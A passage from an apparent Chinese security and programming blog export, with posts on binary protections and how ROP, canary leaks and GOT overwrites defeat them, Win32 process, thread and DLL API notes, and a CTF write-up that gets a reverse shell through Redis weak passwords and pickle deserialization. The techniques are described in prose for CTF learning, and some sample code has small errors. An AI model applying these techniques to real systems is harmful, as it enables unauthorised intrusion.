title="No-Execute"></a>No-Execute</h5><blockquote><p>首先我们先介绍NX, NX的全称是 No Execute 就是不能执行的意思 那么是什么不可以执行呢？ 说到这里我觉得我们可以先简单谈谈ELF文件结构(这个文件结构在下面部分我会详细说明)ELF文件，其实就是我们常说的可执行文件(这里指Linux平台，windows平台主要是PE，后面我会详细解释) 学过编程我应该都知道编译会把我们写好的源代码编译成<code>目标文件</code>, 在经过编译器链接后就生成了<code>可执行文件</code> 可执行文件一般由以下几个部分组成：</p><ul><li>Header // 文件头</li><li>Program Header Table 程序头表</li><li>Section Header Table 节头表</li><li>Section 节</li></ul></blockquote><blockquote><p>可执行文件能够运行 实际上就是计算机将可执行文件加载到内存里面去(注: 这里存在一个映射关系，后面有机会在详细介绍)而我们写好的程序代码实际上可以抽象成两部分</p><ul><li>指令</li><li>数据</li></ul></blockquote><blockquote><p>我们所有指令 会集中放在一个内存的一个地(<code>.text</code>), 数据也会集中的放在另一个地方(<code>.data</code>, <code>.rodata</code>, <code>.bss</code>)而eip寄存器主要数据就在于.text的位置 因为它的主要作用就是指向下一条指令的地址</p></blockquote><blockquote><p><code>NX</code>的主要作用就是<code>.text</code>的内存区域只有<code>可读可执行的权限</code>(r, x), 而其他区域没有可执行权限，换句话说就是能读能执行的地方没有可写入权限，能写入的地方没有可执行权限，简而言之就是权限分离。</p></blockquote><blockquote><p>突破NX的攻击技术目前主要就是ROP， 虽然NX成功将权限从栈上分离出去，但是在.text段 也就是代码段中必定会存在小片段(专业术语是<code>gadgets</code>)，可以执行，而gadgets实际上就是以<code>ret</code>指令结尾的序列，通过这些指令序列我们就可以利用栈溢出来劫持整个程序的流程，来执行我们想要执行的代码。</p></blockquote><blockquote><p>ROP攻击一般需要满足以下条件:</p><ul><li>程序存在溢出，且能覆盖返回地址。</li><li>可以找到满足条件的ROPgadgets 以及相应的gadgets的地址，如果开启随机化那么就需要获取动态地址</li></ul></blockquote><blockquote><p>一般我们可以通过 ROPgadgets工具来查找gadgets<br>在我集成的环境中已经给gef集成了ropper插件可以直接使用，效果如图:<br><img src="./img/ropper.png" alt="ropper"></p></blockquote><blockquote><p>还有如果我们拿到了题目使用的Libc那么我们就可以通过one_gadget 直接获取getshell的地址 但可能有利用条件，效果如图：<br><img src="./img/one_gadget.png" alt="one_gadget"></p></blockquote><blockquote><p>为了节约篇幅，关于高级的ROP的高级技术请查看<a href="https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/" target="_blank" rel="noopener">CTF-Wiki-ROP</a></p></blockquote><h5 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h5><blockquote><p>了解NX我们再来看看<code>Canary</code>，这种保护机制就像它名字一样<code>金丝雀</code>(据说来自于很久以前矿工们用这种鸟来测试矿井是否有毒)，借用CTF-Wiki的图片来描述<br><img src="./img/canary.png" alt="canary"><br>图片上这个就是canary的示意图</p></blockquote><blockquote><p>canary实际上就是每次程序启动时在图示位置生成一道随机数，当函数执行完成时都会先检测这个随时是否改变，如果改变说明程序可能发生溢出了，那么就强制退出程序，不继续往下执行，在IDA里面我们可能要看得直观些<br><img src="./img/canary_ida.png" alt="canary_ida"><br>图示位置就是在对canary进行判断</p></blockquote><blockquote><p>在gdb中canary就长这个样<br><img src="./img/canary_gdb.png" alt="canary_gdb"><br>从图中我们可以发现两个问题</p><ol><li>按照wiki的图示64位上canary在rbp-8的位置上，那么在32位应该在ebp-4的位置上啊，其实不然，我们一定要亲手去调试，去观察，才能发现问题，不能凭空猜想</li><li>canary的末尾都是00，对正因为我们在图里看见是末尾为00，才能防止它被不小心读出来，这特意设计的。</li></ol></blockquote><blockquote><p>那么我们怎么突破这个canary的保护机制呢？</p></blockquote><blockquote><p>实际在栈溢出阶段很简单，只需要先溢出覆盖canary的最后两个00使其不被截断，在通过输出函数来打印出来，我们就能成功泄露canary，注意第一次用来泄露canary的payload我们应该以程序起始地址来结束，这样可以跳到程序最开始的地方，一是可以刷新栈空间，二是可以再次触发漏洞来写入新的paylaod，这一点很重要，我们泄露canary的目的就是为了第二次触发溢出去修改返回地址时在把canary放回他应原地，放在程序直接退出，这个才是我们主要目的，其实到后期还有几种可以突破canary的姿势，但是我们需要一些关于堆的姿势，这个我后期做总结时会写，有兴趣的可以查看<a href="https://wiki.x10sec.org/pwn/mitigation/Canary/" target="_blank" rel="noopener">CTF-Wiki-Canary</a></p></blockquote><h5 id="RelRO"><a href="#RelRO" class="headerlink" title="RelRO"></a>RelRO</h5><blockquote><p>这个保护机制主要目的就是降低可写区域，但网上查到说只有全开才能缓解覆盖GOT表攻击（其实不一定，能不能覆盖GOT表，还是得需要看GOT表有没有可写权限）。</p></blockquote><blockquote><p>这里可以顺便说一下覆盖GOT表攻击，其实这个比较简单，但我们得先了解动态链接库与延迟绑定技术的原理。</p></blockquote><blockquote><p><code>动态链接库也称为动态共享库</code>，是为了静态库的缺陷，静态库就相当于直接把库函数的源码与程序的源码编译到一起，每次更新程序，部署程序都需要重新编译一整套源码，为了解决这个问题，提出了动态共享库的概念，意思就是把一些公共函数，或者可以从源码中提取的模块化的内容，放到一边，单独编译，主程序需要用时，在载入程序。</p></blockquote><blockquote><p><code>延迟绑定技术</code>，是为了弥补使用动态链接库时程序性能的缺陷，因为在使用动态链接库时，每次程序调用库里面的函数，都需要通过GOT表进行重定位，这样会减弱程序的性能，所以提出了延迟绑定的概念，简单来说就是当程序第一次使用到的函数才进行重定位后绑定。大致流程如图所示：<br><img src="./img/lazy_binding.png" alt="laze_binding"></p></blockquote><blockquote><p>从图中我们也可以出实际上重定位与绑定函数通过GOT表交给了<code>_dl_runtime_resolve</code>这个函数，这里实际上又有一种攻击手段可以同时绕过NX与PIE</p></blockquote><h5 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h5><blockquote><p>全称为空间地址随机化，这个其实没多少解释的，就是地址随机化，但注意，Wiki上说也仅仅只是针对中间部分的地址随机化，在我们泄露libc时，完全可以只需要泄露后面12位来查询libc</p></blockquote><hr><h3 id="关于文件结构"><a href="#关于文件结构" class="headerlink" title="关于文件结构"></a>关于文件结构</h3><blockquote><p>啊 写道这里快写不下去了 感觉内容太多 不是一次能讲得完的<br>后面更新链接补在上面</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows进程控制</title>
      <link href="/2019/07/11/Windows%E8%BF%9B%E7%A8%8B%E6%8E%A7%E5%88%B6/"/>
      <url>/2019/07/11/Windows%E8%BF%9B%E7%A8%8B%E6%8E%A7%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows进程控制"><a href="#Windows进程控制" class="headerlink" title="Windows进程控制"></a>Windows进程控制</h1><h2 id="程序入口"><a href="#程序入口" class="headerlink" title="程序入口"></a>程序入口</h2><blockquote><p><img src="%E7%A8%8B%E5%BA%8F%E5%85%A5%E5%8F%A3.png" alt="程序入口"></p></blockquote><h2 id="获取系统版本信息"><a href="#获取系统版本信息" class="headerlink" title="获取系统版本信息"></a>获取系统版本信息</h2><pre><code class="c++">OSVERSIONINFO vs = {sizeof(vs)};GetVersionEx(&amp;vs);DWORD dwBaseAddr;if(vs.dwPlatformld==VER_PLATFORM_WIN32_WINDOWS){    prinrf(&quot;This is Windows 98...\n&quot;);    dwBaseAddr = 4 * KONEK * KONEK;}else if(vs.dwPlatformld==VER_PLATFORM_WIN32_NT){    printf(&quot;This is windows NT...\n&quot;)    dwBaseAddr = 64 * KONEK;}</code></pre><h2 id="创建进程："><a href="#创建进程：" class="headerlink" title="创建进程："></a>创建进程：</h2><p><img src="%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B.png" alt="创建进程"></p><pre><code class="c++">BOOL CreateProcessA(  LPCSTR                lpApplicationName,      //对象名称  LPSTR                 lpCommandLine,          //命令行  LPSECURITY_ATTRIBUTES lpProcessAttributes,    //需要继承的句柄  LPSECURITY_ATTRIBUTES lpThreadAttributes,     //需要继承的线程句柄  BOOL                  bInheritHandles,        //是否继承句柄  DWORD                 dwCreationFlags,        //创建标志  LPVOID                lpEnvironment,          //使用父进程环境变量  LPCSTR                lpCurrentDirectory,     //使用父进程目录作为当前目录, 可以自行设置  LPSTARTUPINFOA        lpStartupInfo,          //STARTUPINFOW结构体 详细信息  LPPROCESS_INFORMATION lpProcessInformation    //PROCESSINFORMATION结构体 进程信息);</code></pre><h2 id="进程控制："><a href="#进程控制：" class="headerlink" title="进程控制："></a>进程控制：</h2><p><img src="%E8%BF%9B%E7%A8%8B%E6%8E%A7%E5%88%B6.png" alt="进程控制"></p><h3 id="遍历进程："><a href="#遍历进程：" class="headerlink" title="遍历进程："></a>遍历进程：</h3><pre><code class="c++">//创建系统进程快照HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//获取其余进程信息while(bMore){    printf(&quot;进程ID: %d\n&quot;, pc.th32ProcessID);    printf(&quot;进程名称: %s\n&quot;, pc.szExeFile);    bMore = Process32Next(hProcessSnap, &amp;pc);}//关闭系统快照CloseHandle(hProcessSnap);</code></pre><h3 id="打开进程"><a href="#打开进程" class="headerlink" title="打开进程"></a>打开进程</h3><blockquote><ul><li>对于已经存在的进程需要通过OpenProcess函数打开进程并获取该进程的句柄</li></ul></blockquote><pre><code class="c++">HANDLE OpenProcess(    //获取权限, PROCESS_ALL_ACCESS    DWORD dwDesiredAccess,    BOOL bInheritHandle, //指定句柄是否可以继承    DWORD dwProcessld // 进程的ID)</code></pre><h3 id="终止进程"><a href="#终止进程" class="headerlink" title="终止进程:"></a>终止进程:</h3><blockquote><ul><li>进程中的一个线程调用了ExitProcess() //自杀</li><li>其他进程中的一个线程调用了TerminateProcess // 它杀</li></ul></blockquote><blockquote><p>他杀:</p></blockquote><pre><code class="c++">//打开进程，获取句柄HANDLE hHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwld);if(hHandle != NULL){    //终止进程    TerminateProcess(hHandle, 0);}//关闭句柄CloseHandle(hHandle);</code></pre><h2 id="模块目录与工作目录API"><a href="#模块目录与工作目录API" class="headerlink" title="模块目录与工作目录API"></a>模块目录与工作目录API</h2><pre><code class="c++">GetModuleFileName(NULL, strModule, 256) //模块目录GetCurrentDirectory(1000, buf) //工作目录</code></pre><h2 id="其他进程相关API"><a href="#其他进程相关API" class="headerlink" title="其他进程相关API:"></a>其他进程相关API:</h2><pre><code class="c++">//获取进程PIDGETCurrentProcessid//获取进程句柄GetCurrentProcess//获取命令行GetCommandLine//获取启动信息GetStartupInfo//遍历进程PIDEnumProcesses//快照CreateToolhelp32Snapshot</code></pre><h2 id="其他相关API"><a href="#其他相关API" class="headerlink" title="其他相关API"></a>其他相关API</h2><pre><code class="c++">GetNativeSystemInfo(SYSTEM_INFO systemInfo);GetSystemInfo();</code></pre><blockquote><p>示例:</p></blockquote><pre><code class="c++">int main(void){    SYSTEM_INFO systemInfo;    GetNativeSystemInfo(&amp;systemInfo);    std::cout &lt;&lt; &quot;处理器个数: &quot; &lt;&lt; systemInfo.dwNumberOfProcessors &lt;&lt; std::endl        &lt;&lt; &quot;分配粒度: &quot; &lt;&lt; systemInfo.dwAllocationGranularity &lt;&lt; std::endl        &lt;&lt; &quot;分页大小: &quot; &lt;&lt; systemInfo.dwPageSize &lt;&lt; std::endl        &lt;&lt; &quot;最小寻址单元: &quot; &lt;&lt; systemInfo.lpMinimumApplicationAddress &lt;&lt; std::endl        &lt;&lt; &quot;最大寻址单元: &quot; &lt;&lt; systemInfo.lpMaximumApplicationAddress &lt;&lt; std::endl;    std::cout &lt;&lt; &quot;--&quot; &lt;&lt; systemInfo.wProcessorArchitecture &lt;&lt; &quot;--&quot; &lt;&lt; std::endl;    if (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ALPHA64)    {        std::cout &lt;&lt; &quot;该操作系统是64位&quot; &lt;&lt; std::endl;    }    else    {        std::cout &lt;&lt; &quot;该操作系统是32位&quot; &lt;&lt; std::endl;    }    system(&quot;pause&quot;);    return 0;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> Windows </tag>
            
            <tag> C/C++ </tag>
            
            <tag> Win32 </tag>
            
            <tag> 进程对象 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows线程控制</title>
      <link href="/2019/07/10/Windows%E7%BA%BF%E7%A8%8B%E6%8E%A7%E5%88%B6/"/>
      <url>/2019/07/10/Windows%E7%BA%BF%E7%A8%8B%E6%8E%A7%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows线程"><a href="#Windows线程" class="headerlink" title="Windows线程"></a>Windows线程</h1><pre><code class="c++">HANDLE CreateThread（LPSECURITY_ATTRIBUTES lpThreadAttributes,    //指向线程安全属性的指针DWORD dwStackSize,    //初始线程堆栈大小，以字节为单位LPTHREAD_START_ROUTINE lpStartAddress,    //指向线程函数的指针LPVOID lpParameter,    //新线程 参数DWORD dwCreationFlags,    //创建标志LPDWORD lpThreadId    //指向返回的线程标识符);</code></pre><h2 id="一段创建线程的函数"><a href="#一段创建线程的函数" class="headerlink" title="一段创建线程的函数"></a>一段创建线程的函数</h2><blockquote></blockquote><pre><code class="c++">#include &lt;iostream&gt;#include &lt;Windows.h&gt;DWORD WINAPI ThreadFunc(LPVOID lpParam){    //TODO: code;    for (int i = 0; i &lt; 5; i++)    {        printf_s(&quot;+++++++%d\n&quot;, i);    }    return 0;}int main(){    HANDLE NewThreadHandle;    NewThreadHandle = CreateThread(NULL, NULL, ThreadFunc, NULL, NULL, NULL);    if (NewThreadHandle != NULL)    {        CloseHandle(NewThreadHandle);    }    for (int i = 0; i &lt; 5; i++)    {        printf_s(&quot;--------%d\n&quot;, i);    }    return 0;}</code></pre><blockquote><p>某次输出结果:</p></blockquote><pre><code class="shell">--------0--------1--------2--------3--------4+++++++0+++++++1+++++++2+++++++3+++++++4</code></pre><h2 id="线程控制相关API"><a href="#线程控制相关API" class="headerlink" title="线程控制相关API:"></a>线程控制相关API:</h2><pre><code class="c++">//让自己停下来    Sleep()//让别人停下来    SuspendThread()//线程回复    ResumeThread()//等待线程线程结束    1. WaitForSingleObject(        HANDLE hThread,         dwMilliseconds INFINITE        )    2. WaitForMultipleObjects(        DWORD nCount,        CONST HANDLE *lpHandles,        BOOL bWaitAll,        DWORD dwMilliseconds    )    3. GetExitCodeThread()</code></pre><h3 id="线程上下文"><a href="#线程上下文" class="headerlink" title="线程上下文"></a>线程上下文</h3><blockquote><p>CONTEXT context;<br>先挂住线程: SuspendThread();<br>context.ContextFlags = CONTEXT_INTEGER; //获取那段取哪段</p></blockquote><blockquote><p>相关API</p></blockquote><pre><code class="c++">BOOL GetThreadContext(    HANDLE hThread,    LPCONTEXT lpContext)BOOL SetThreadContext(    HANDLE hThread,    CONST CONTEXT *lpContext)</code></pre><h2 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h2><h3 id="普通临界资源"><a href="#普通临界资源" class="headerlink" title="普通临界资源"></a>普通临界资源</h3><p><img src="./%E4%B8%B4%E7%95%8C%E5%8C%BA-%E4%BB%A4%E7%89%8C.png" alt="临界区-令牌.png"></p><pre><code class="c++">//创建全局变量    CRITICAL_SECTION cs;//初始化全局变量    InitializeCriticalSection(&amp;cs);//实现临界区    EnterCriticalSection(&amp;cs);    LeaveCriticalSection(&amp;cs);</code></pre><h3 id="内核级临界资源"><a href="#内核级临界资源" class="headerlink" title="内核级临界资源"></a>内核级临界资源</h3><p><img src="./%E5%86%85%E6%A0%B8%E4%BA%92%E6%96%A5%E4%BD%93.png" alt="内核互斥体"></p><blockquote><p>相关API</p></blockquote><pre><code class="c++">//创建互斥体HANDLE CreateMutex(    LPSECURITY_ATTRIBUTES lpMutexATTributes,    BOOL bInitialOwner,    LPCTSTR lpName)//获取令牌WaitForSingleObject(    HANDLE g_hMutex,    INFINITE)//释放令牌ReleaseMutex(HANDLE g_hMutex)//获取错误信息//可以防止多开DWORD dwRet = GetLastError()if(ERROR_ALREADY_EXISTS == dwRet){    CloseHandle(hMutex);    return 0;}</code></pre><h2 id="通知类型-事件-内核对象"><a href="#通知类型-事件-内核对象" class="headerlink" title="通知类型-事件(内核对象)"></a>通知类型-事件(内核对象)</h2><pre><code class="c++">//创建EventHANDLE CreateEvent(    LPSECURITY_ATTRIBUTES lpEventAttributes,    BOOL bManualReset,    BOOL bInitialState,    LPCTSTR lpName)</code></pre><h3 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h3><blockquote><p>线程互斥: 线程互斥是指对于共享的进程系统资源, 在各单位线程访问时的<code>排他性</code>。当有若干个线程都要使用某一个共享资源时, <code>任何时刻最多只允许一个线程去执行使用</code>, 其他要使用该资源的线程必须等待, 直到占有资源者释放该资源。</p></blockquote><blockquote><p>线程同步: 线程同步是指线程之间所具有的一种<code>制约关系</code>, 一个线程的执行依赖另一个线程的消息, 当它没有得到另一个线程的消息时应等待, 直到消息到达时才被唤醒。</p></blockquote><blockquote><p>同步的前提是互斥<br>同步 = 互斥 + 有序</p></blockquote><h4 id="生产者消费者模型"><a href="#生产者消费者模型" class="headerlink" title="生产者消费者模型:"></a>生产者消费者模型:</h4><pre><code class="c++">//生产者线程函数DWORD WINAPI ThreadProduct(LPVOID pM){    for(int i=0; i&lt;g_Max; i++)    {        WaitForSingleObject(g_hSet, INFINITE);        g_Number = 1;        DWORD id = GetCurrentThreadId();        printf(&quot;生产者%d将数据%d放入缓冲区\n&quot;, id, g_Number);        SetEvent(g_hClear);    }    return 0 ;}//消费者线程函数DWORD WINAPI ThreadConsumber(LPVOID pm){    for(int i=0; i&lt;g_Max; i++)    {        WaitForSingleObject(g_hClear, INFINITE);        g_Number = 1;        DWORD id = GetCurrentThreadId();        printf(&quot;消费者%d将数据%d放入缓冲区\n&quot;, id, g_Number);        SetEvent(g_hSet);    }    return 0 ;}//主函数int main(int argc, const char* argv[]){    HANDLE hThreads[2];    g_hSet = CreateEvent(NULL, FALSE, TRUE, NULL);    g_hClear = CreateEvent(NULL, FALSE, FALSE, NULL);    hThread[0] = ::CreateThread(NULL, NULL, ThreadProduct, NULL, NULL, NULL);    hThread[1] = ::CreateThread(NULL, NULL, ThreadProduct, NULL, NULL, NULL);    WaitForMultipleObjects(2, hThreads, TRUE, INFINITE);    CloseHandle(hThread[0]);    CloseHandle(hThread[1]);    return 0;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 分类1 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> Windows </tag>
            
            <tag> C/C++ </tag>
            
            <tag> Win32 </tag>
            
            <tag> 线程对象 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C/C++动态链接库</title>
      <link href="/2019/07/08/C-C-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"/>
      <url>/2019/07/08/C-C-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="windows下C-C-动态链接库"><a href="#windows下C-C-动态链接库" class="headerlink" title="windows下C/C++动态链接库"></a>windows下C/C++动态链接库</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h2><blockquote><p>C/C++动态链接库笔记</p></blockquote><h2 id="动态链接库创建和使用"><a href="#动态链接库创建和使用" class="headerlink" title="动态链接库创建和使用"></a>动态链接库创建和使用</h2><h3 id="创建动态链接库"><a href="#创建动态链接库" class="headerlink" title="创建动态链接库"></a>创建动态链接库</h3><pre><code class="c++">extern&quot;C&quot; _declspec(dllexport) __stdcall int funcname (parmlist);</code></pre><blockquote><p>在cpp里面正常实现函数</p></blockquote><h4 id="关于调用约定"><a href="#关于调用约定" class="headerlink" title="关于调用约定:"></a>关于调用约定:</h4><table><thead><tr><th align="center">调用约定</th><th align="center">堆栈清除</th><th align="center">参数传递</th></tr></thead><tbody><tr><td align="center">__cdecl</td><td align="center">调用者</td><td align="center">从右到左, 通过堆栈传递</td></tr><tr><td align="center">__stdcall</td><td align="center">函数体</td><td align="center">从右到左,通过堆栈传递</td></tr><tr><td align="center">__fastcall</td><td align="center">函数体</td><td align="center">从右到左,优先使用寄存器(ECX,EDX),然后使用堆栈</td></tr><tr><td align="center">thiscall</td><td align="center">函数体</td><td align="center">this指针默认通过ECX传递,其它参数从右到左入栈</td></tr></tbody></table><blockquote><p>使用.def,如:</p></blockquote><pre><code class="c++">EXPORTSfuncname @numberfuncname @number NONAME</code></pre><hr><h2 id="使用动态链接库"><a href="#使用动态链接库" class="headerlink" title="使用动态链接库"></a>使用动态链接库</h2><h3 id="显示调用"><a href="#显示调用" class="headerlink" title="显示调用"></a>显示调用</h3><blockquote><p>定义函数指针:</p></blockquote><pre><code class="c++">typedef int (__stdcall *lpPlus)(int, int);typedef int (__stdcall *lpSub)(int, int);</code></pre><blockquote><p>生命函数指针变量:</p></blockquote><pre><code class="c++">lpPlus myPlus;lpPlus myPlus;</code></pre><blockquote><p>动态加载dll到内存:</p></blockquote><pre><code class="c++">HINSTANCE hModule = LoadLibrary(&quot;DllDome.dll&quot;);</code></pre><blockquote><p>获取函数地址:</p></blockquote><pre><code class="c++">myPlus = (lpPlus)GetProcAddress(hModule, &quot;Plus&quot;);mySub = (lpSub)GetProcAddress(hModule, (cahr*)0x0D);</code></pre><blockquote><p>调用函数:</p></blockquote><pre><code class="c++">int a = myPlus(10, 2);int b = mySub(10, 2);</code></pre><blockquote><p>释放动态链接库:</p></blockquote><pre><code class="c++">FreeLibrary(hModule);</code></pre><hr><h3 id="隐式调用"><a href="#隐式调用" class="headerlink" title="隐式调用"></a>隐式调用</h3><blockquote><ul><li>将 *.dll *.lib 放到工程目录下面</li><li>引入头文件</li><li>cpp文件中加入:<code>#pragma comment(lib,&quot;DLLName.lib&quot;)</code></li></ul></blockquote><hr><h3 id="DLL生存周期"><a href="#DLL生存周期" class="headerlink" title="DLL生存周期:"></a>DLL生存周期:</h3><pre><code class="c++">// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;framework.h&quot;BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        //被进程调用:        MessageBox(NULL, L&quot;I was attached by PROCESS&quot;, L&quot;DLL生命周期提示框&quot;, MB_OK);        break;    case DLL_THREAD_ATTACH:        //被线程调用:        MessageBox(NULL, L&quot;I was attached by THREAD&quot;, L&quot;DLL生命周期提示框&quot;, MB_OK);        break;    case DLL_THREAD_DETACH:        //被线程释放        MessageBox(NULL, L&quot;I was detached by PROCESS&quot;, L&quot;DLL生命周期提示框&quot;, MB_OK);        break;    case DLL_PROCESS_DETACH:        //被线程释放        MessageBox(NULL, L&quot;I was detached by PROCESS&quot;, L&quot;DLL生命周期提示框&quot;, MB_OK);        break;    }    return TRUE;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c/c++ </tag>
            
            <tag> 动态链接库 </tag>
            
            <tag> DLL </tag>
            
            <tag> WIN32API </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FLAG-领取系统</title>
      <link href="/2019/07/08/FLAG-%E9%A2%86%E5%8F%96%E7%B3%BB%E7%BB%9F/"/>
      <url>/2019/07/08/FLAG-%E9%A2%86%E5%8F%96%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="FLAG-领取系统"><a href="#FLAG-领取系统" class="headerlink" title="FLAG-领取系统"></a>FLAG-领取系统</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h2><blockquote><p>前段时间，看见几篇帖子，分别提到一个redis数据库未授权访问，和一个pickle反序列化漏洞，这个两个问题在生产环境很常见，redis当作高速缓存来存放cookie时，序列化字符串存为cookie对于的value可以来保存用户现场，开发人员一直认为数据库在本地，从而数据源可信，因此不做过滤，So,攻击者的突破口便在redis数据库，拿下数据库后，便可以写入exploit,从而引发反序列化漏洞，getshell。</p></blockquote><hr><h2 id="题目考点"><a href="#题目考点" class="headerlink" title="题目考点"></a>题目考点</h2><blockquote><ul><li>收集信息：资料查询，nmap（端口及服务）</li><li>Metasploit-framework 模块攻击redis 弱口令 预计正常拿到密码只需要5秒 </li><li>基于python3-pickle模块的反序列化漏洞利用，及EXP编写</li><li>nc 接收反弹shell操作</li></ul></blockquote><hr><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路:"></a>解题思路:</h2><blockquote><p>Tips: 题目提示<br>1、信息收集基本功<br>2、msf会用吗？pickle熟悉吗？<br>3、啥？你说你不会接收shell，那你装nc有啥用</p></blockquote><blockquote><p><img src="./start.png" alt="start"></p></blockquote><blockquote><ul><li>题目上有cookie，且基于高速缓存保存用现场，则百度,谷哥 查询关键字以及深度挖掘数据后得到 redis数据库可以作为web开发中的高速缓存来使用，且redis很多时候存在未授权访问，同时密码验证速度极快。</li></ul></blockquote><p><img src="./nmap.png" alt="namp"></p><p><img src="./info_collect.png" alt="信息收集"></p><blockquote><ul><li>尝试使用MSF来攻击，之后拿到redis数据库的密码，以及登录权限。<br><img src="./attack_1.png" alt="attack_1"></li></ul></blockquote><blockquote><ul><li>继续尝试msf中的redis文件上传攻击模块，发现redis被降权无法写入文件。</li></ul></blockquote><blockquote><ul><li>登录redis后发现key值为cookie,value值很想序列化后的数据流，抓包过程中发现服务器使用的python3编写。</li><li>继续信息收集步骤，后发现python3，pickle模块可用于保存用户现场，但是可能存在反序列化漏洞，导致任意代码读写楼，可以本地构造poc。<br><img src="./attack_2.png" alt="attack_2"></li></ul></blockquote><blockquote><ul><li>整合思路：先注册账号，使得数据库中存在对于key为cookie，构造exp向redis中key=cookie的value值为exploit,然后打开nc监听指定端口 利用改cookie登录引发反序列化漏洞，反弹shell，cat flag。<br><img src="./attack_3.png" alt="attack_3"></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
